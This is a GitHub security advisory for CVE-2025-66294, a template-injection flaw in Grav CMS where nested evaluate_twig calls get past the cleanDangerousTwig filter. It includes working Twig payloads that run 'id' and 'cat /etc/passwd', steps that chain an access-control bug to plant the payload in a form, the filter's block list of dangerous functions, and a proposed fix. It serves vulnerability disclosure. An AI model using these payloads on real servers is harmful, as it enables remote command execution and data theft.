# [H] Grav is vulnerable to RCE via SSTI through Twig Sandbox Bypass

## Summary
Severity: High
Advisory: GHSA-662m-56v4-3r8f
CVE: CVE-2025-66294
CWE: CWE-1336, CWE-94
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2025-12-02
Source: https://github.com/advisories/GHSA-662m-56v4-3r8f
Type: github-advisory

## Affected
- Packagist: `getgrav/grav` — affected >=0 <1.8.0-beta.27

## Details
### Summary
A Server-Side Template Injection (SSTI) vulnerability exists in Grav that allows authenticated attackers with editor permissions to execute arbitrary commands on the server and, under certain conditions, may also be exploited by unauthenticated attackers. This vulnerability stems from weak regex validation in the `cleanDangerousTwig` method.

### Important
- First of all this vulnerability is due to weak sanitization in the method `clearDangerousTwig`, so any other class that calls it indirectly through for example `$twig->processString` to sanitize code is also vulnerable.

- For this report, we will need the official Form and Admin plugin installed, also I will be chaining this with another vulnerability to allow an editor which is a user with only pages permissions to edit the process section of a form.

- I made another report for the other vulnerability which is a Broken Access Control which allows a user with full permission for pages to change the process section by intercepting the request and modifying it.

### Permissions Needed
- The main case for this vulnerability is an editor which can unconditionally takeover the whole system through creating a vulnerable form.
- Second case is as an unauthenticated user, so if the form exists already and accepts user input and puts it through `evaluate_twig`, a guest can takeover the system.

### Details
When we make a form with a process section and a `message` action, when the form is submitted we get to deal with `onFormProcess` in `form.php` through the `message` case:

```php
            case 'message':
                $translated_string = $this->grav['language']->translate($params);
                $vars = array(
                    'form' => $form
                );

                /** @var Twig $twig */
                $twig = $this->grav['twig'];
                $processed_string = $twig->processString($translated_string, $vars);

                $form->message = $processed_string;
                break;
```

Which takes our parameters as in our action values, like in our case the value of our `message` action and sends it to `processString` which then calls the method `cleanDangerousTwig` from `Security.php`, now here's where we find the vulnerability is caused by two things:

- First of all is weak regex which doesn't account for nested function calls, which allows us to bypass this function's sanitization
- Second issue which is the `evaluate` and `evaluate_twig` functions which are allowed, and since we can call Twig syntax from inside them, it will lead to nested function calls which we can bypass and thus execute arbitrary payloads.

```php
    public static function cleanDangerousTwig(string $string): string
    {
        if ($string === '') {
            return $string;
        }

        $bad_twig = [
            'twig_array_map',
            'twig_array_filter',
            'call_user_func',
            'registerUndefinedFunctionCallback',
            'undefined_functions',
            'twig.getFunction',
            'core.setEscaper',
            'twig.safe_functions',
            'read_file',
        ];
         
        // This allows for a payload like {{ evaluate("read_file('/etc/passwd')") }}
        $string = preg_replace('/(({{\s*|{%\s*)[^}]*?(' . implode('|', $bad_twig) . ')[^}]*?(\s*}}|\s*%}))/i', '{# $1 #}', $string);
        return $string;
    }
```

### PoC

First to showcase how the function handles the payload, I built a small php program that replicates the behavior of `cleanDangerousTwig`:

```php
<?php

function cleanDangerousTwig(string $string): string
{
    if ($string === '') {
        return $string;
    }

    $bad_twig = [
        'twig_array_map',
        'twig_array_filter',
        'call_user_func',
        'registerUndefinedFunctionCallback',
        'undefined_functions',
        'twig.getFunction',
        'core.setEscaper',
        'twig.safe_functions',
        'read_file',
    ];
    $string = preg_replace('/(({{\s*|{%\s*)[^}]*?(' . implode('|', $bad_twig) . ')[^}]*?(\s*}}|\s*%}))/i', '{# $1 #}', $string);

    return $string;
}

$x = $argv[1];
echo cleanDangerousTwig("evaluate_twig('$x')");
```

We can run the program with this payload:

```bash
php ok.php "{{ grav.twig.twig.registerUndefinedFunctionCallback('system') }} {% set a = grav.config.set('system.twig.undefined_functions',false) %} {{ grav.twig.twig.getFunction('cat /etc/passwd') }}"
```

Our payload goes through and not one malicious function is filtered:

```
evaluate_twig('{# {{ grav.twig.twig.registerUndefinedFunctionCallback('system') }} #} {# {% set a = grav.config.set('system.twig.undefined_functions',false) %} #} {# {{ grav.twig.twig.getFunction('cat /etc/passwd') }} #}')
```

Now we know that our payload definitely works so let's try it through a custom form this time, as an editor:

- Go to pages
- Add a page and create a new form or choose an exiting one

We will be using another vulnerability I found which is a Broken Access Control vulnerability, which allows an editor with basically only pages rights to modify a form's action sections without being in expert mode ( please refer to [it's report](https://github.com/getgrav/grav/security/advisories/GHSA-v8x2-fjv7-8hjh) ), so when we go to our form and save it, we can intercept the request and inject the following payload into `data[_json][header][form]` which is the header for our form which we shouldn't normally be able to modify:

```
{"name":"ssti-test 2","fields":{"name":{"type":"text","label":"Name","required":true}},"buttons":{"submit":{"type":"submit","value":"Submit"}},"process":[]}
```

URL-encode it before sending it should look something like this:

![image](https://github.com/user-attachments/assets/c3345f1f-c613-4534-a15c-bd1cf7e4b2f5)

![image](https://github.com/user-attachments/assets/e9685357-b85d-432a-842b-27a28487b7d1)

Request sent and processed! Now when you go to our form file you can see added a process section with the value of message changed:

![image](https://github.com/user-attachments/assets/c87bdc3b-712c-465f-bd0d-9951ca826a6a)

Content of form:

```
title: Home
process:
    markdown: true
    twig: true
form:
    name: test
    fields:
        name:
            type: text
            label: Name
            required: true
    buttons:
        submit:
            type: submit
            value: submit
    process:
        -
            message: '{{ evaluate_twig(form.value(''name'')) }}'
```

Now in the process section, notice our message action is gonna take value from the Name input, using the following payload we will execute the command `id` on the system:

```
{{ grav.twig.twig.registerUndefinedFunctionCallback('system') }} {% set a = grav.config.set('system.twig.undefined_functions',false) %} {{ grav.twig.twig.getFunction('id') }}
```

Now we can visit the page and input our payload, submit and we got command result:

![image](https://github.com/user-attachments/assets/46571c3c-53ad-4028-b607-8c8f1c26b0c2)


### Impact

Allows an attacker to execute arbitrary commands, leading to full system compromise, including unauthorized access, data theft, privilege escalation, and disruption of services.

### Recommended Fix

- Blacklist both the `evaluate` and `evaluate_twig` functions.
- We could add second check to `cleanDangerousTwig` where we would look for each malicious function no matter it's position:

```php
<?php

function cleanDangerousTwig(string $string): string
{
    if ($string === '') {
        return $string;
    }

    $bad_twig = [
        'twig_array_map',
        'twig_array_filter',
        'call_user_func',
        'registerUndefinedFunctionCallback',
        'undefined_functions',
        'twig.getFunction',
        'core.setEscaper',
        'twig.safe_functions',
        'read_file',
    ];
    $string = preg_replace('/(({{\s*|{%\s*)[^}]*?(' . implode('|', $bad_twig) . ')[^}]*?(\s*}}|\s*%}))/i', '{# $1 #}', $string);

    foreach ($bad_twig as $func) {
        $string = preg_replace('/\b' . preg_quote($func, '/') . '(\s*\([^)]*\))?\b/i', '{# $1 #}', $string);
    }

    return $string;
}

$x = $argv[1];
echo cleanDangerousTwig("evaluate_twig('$x')");
```

When we run this, the result is:
```
evaluate_twig('{# {{ grav.twig.twig.{#  #}('system') }} #} {# {% set a = grav.config.set('system.twig.{#  #}',false) %} #} {# {{ grav.twig.{#  #}('cat /etc/passwd') }} #}')
```
You can see we managed to stop the payload and filter out the malicious functions.

## References
- https://github.com/getgrav/grav/security/advisories/GHSA-662m-56v4-3r8f
- https://nvd.nist.gov/vuln/detail/CVE-2025-66294
- https://github.com/getgrav/grav/commit/e37259527d9c1deb6200f8967197a9fa587c6458
- https://github.com/getgrav/grav
